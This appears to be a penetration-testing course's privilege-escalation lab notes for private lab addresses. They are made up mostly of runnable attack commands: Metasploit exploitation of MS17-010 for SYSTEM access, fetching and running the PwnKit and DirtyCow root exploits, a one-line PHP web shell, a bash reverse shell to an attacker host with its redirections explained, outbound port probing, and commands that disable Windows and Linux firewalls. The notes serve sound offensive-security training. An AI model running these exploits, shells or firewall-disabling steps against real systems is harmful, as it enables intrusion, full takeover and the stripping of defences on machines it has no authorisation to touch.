Penetration Test - Privilege Escalation
===

🔙 [MENU README](../README.md#note)


# iLab
Module 6 
```
Parrot Security       192.168.0.18    172.19.19.18
Windows Server 2019   192.168.0.20
Windows Server 2008   192.168.0.7, 21
SSH Server            192.168.0.70
WordPress             192.168.0.24
```

---

> PayloadsAllTheThings
> https://github.com/swisskyrepo/PayloadsAllTheThings

# MS17-010
Detect and Scan
```bash

nmap 192.168.0.7 -sVC -n -Pn
# Port 445 discovered

nmap 192.168.0.7 -sVC -n -Pn -p445 --script smb-protocols.nse
# In-depth probe on port 445; discovered SMBv1
# SMBv1 is vulnerable to MS17-010

nmap 192.168.0.7 -sVC -n -Pn -p445 --script smb-vuln-ms17-010.nse
# Probe specifically for MS17-010 vulnerability


# Nmap Scripts location: ls /usr/share/nmap/scripts/
```
Metasploit
```bash
msfconsole -q # without banner

# set paylaod
msf > search ms17_010
msf > use 2
msf > show options
msf > set rhosts 192.168.0.7
msf > check
msf > exploit  # Attack Success when see "WIN"


# WIN
getuid  # Server username: NT AUTHORITY\SYSTEM
shell
whoami
```

# Sudo
```bash
# su    Switch to target account / requires target account password
# sudo  Pre-authorized execution
#        Whether authentication is required (own password)
#        Path, binary name, parameters  ex. /bin/target -i


sudo -l
# (ALL:ALL) ALL

sudo -i
# Direct privilege escalation to root
```
```bash
# Look up binaries in GTFOBins
GTFOBins
```

# PwnKit
Universal Privilege Escalation for Lower Kernel Versions
> https://github.com/ly4k/PwnKit
```bash
# Version Check
uname -a

wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit32

# Pass1
sudo python3 -m http.server 80
wget 192.168.0.18/PwnKit
# Pass2
scp PwnKit aleksander@192.168.0.70:~/. #dolphin

# Kernel exploits generally require write permissions on the execution path
# /tmp is a great choice
chmod +x PwnKit && ./PwnKit
```

# DirtyCow
```bash
# Older Linux versions: Linux Kernel 2.6.22 < 3.9
# https://www.exploit-db.com/exploits/40847
searchsploit -m 40847

# Pass1
sudo python3 -m http.server 80
wget 192.168.0.18/40847.cpp
# Pass2
scp 40847.cpp aleksander@192.168.0.70:~/.

# how to use : head 40847.cpp
g++ -Wall -pedantic -02 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s
```
```bash
# https://github.com/FireFart/dirtycow/blob/master/README.md
```

# Egress Busting (Remote Control)
Ubuntu (WordPress) One-Liner Web Shell
```bash
# shell.php
<?php system($_GET['cmd']); ?>

curl 192.168.0.24/shell.php?cmd=id
curl -G 192.168.0.24/shell.php --data-urlencode "cmd=id"
# -G : get

# Get Remote Control
nc -vnlp 8888
curl -G 192.168.0.24/shell.php --data-urlencode "cmd=bash -c 'bash -i > /dev/tcp/192.168.0.18/8888 0<&1 2>&1'"
```
How Reverse Shells Work
```bash
# shell
BASH , DASH , ZSH
# shell I/O file descriptors
fd 0  stdin
fd 1  stdout
fd 2  stderr

pidof bash
ls -l /proc/98793/fd
# Observation:
# When a process runs, a PID is created, and corresponding file descriptors (fd) are mapped to /proc/<PID>/fd

# ==============================================

# console
tty : Exists only locally (physical/virtual console)
pty : Pseudo-terminal (remote terminal emulation)
# console I/O
stdin  0
stdout 1
stderr 2

python2
python2 --version 2> /dev/null
# Observation: 
# Python 2 actually outputs its version number to stderr
```
```bash
bash -i > /dev/tcp/192.168.0.18/8888 0<&1 2>&1

bash -i : Interactive shell
>       : 1>    Redirect target machine's BASH stdout to the socket
0<&1    : 0<fd1 Set target machine's BASH stdin source to stdout
          (and stdout was already redirected to the socket)
2>&1    : Redirect target machine's BASH stderr to stdout
          (which is also connected to the socket)

At this point, all I/O (stdin, stdout, stderr) on the target machine is tied to the network socket
```
Test outbound ports that can be used for reverse shells
```bash
# Attacker
sudo tcpdump -ni eth0 tcp[13]==2

# Victim(with nc)
nc -nz 192.168.0.18 1-10

# Victim(without nc)
echo > /dev/tcp/192.168.0.18/100
for port in {200..210};do (echo > /dev/tcp/192.168.0.18/$port) 2> /dev/null;done
```

---


# Persistent
Windows
```bash
# Display Firewall Setting
netsh advf show allprofiles

# Disable Firewall
netsh firewall set opmode disable # old version
netsh advf set allprofiles state off # new version
```
Linux
```bash
# Display iptables Setting
sudo iptables -S

sudo iptables -P INPUT ACCEPT  # Allow all INBOUND
sudo iptables -P OUTPUT ACCEPT # Allow all OUTBOUND

sudo iptables -F # Flush all firewall rules
# Not recommended, as many lab machines block all traffic by default
```